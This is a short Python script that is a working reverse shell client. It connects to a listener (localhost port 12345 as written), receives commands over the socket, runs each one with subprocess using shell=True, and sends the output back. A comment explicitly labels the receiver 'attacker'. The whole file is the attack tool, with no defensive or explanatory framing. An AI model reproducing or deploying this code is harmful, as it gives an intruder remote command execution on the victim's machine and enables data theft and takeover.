import socket
import subprocess, os

HOST = "localhost"
PORT = 12345

connection_socket = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
connection_socket.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connection_socket.connect ((HOST, PORT))

print("\n[*] Connected to " + HOST + " on port " + str(PORT) + ".\n")

while True:
    command = connection_socket.recv (1024).decode ()
    split_command = command.split ()
    print ("Received command: " + command)

    if (command == "quit"):
        break

    if (command.split ()[0] == "cd"):
        if (len (command.split ()) == 1):
            connection_socket.send ((os.getcwd ()))
        elif (len (command.split ()) == 2):
            try:
                os.chdir (command.split ()[1])
            except (WindowsError):
                connection_socket.send (str.encode ("No such directory: " + os.getcwd ()))
    else: 
        # Do shell command
        proc = subprocess.Popen (command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        # Read output
        stdout_value = proc.stdout.read ().decode () + proc.stderr.read ().decode ()
        print (stdout_value + "\n")

        # Send output to attacker
        if (stdout_value != ""):
            connection_socket.send (stdout_value.encode ())
        else: 
            connection_socket.send ((command + " does not return anything").encode ())

connection_socket.close ()


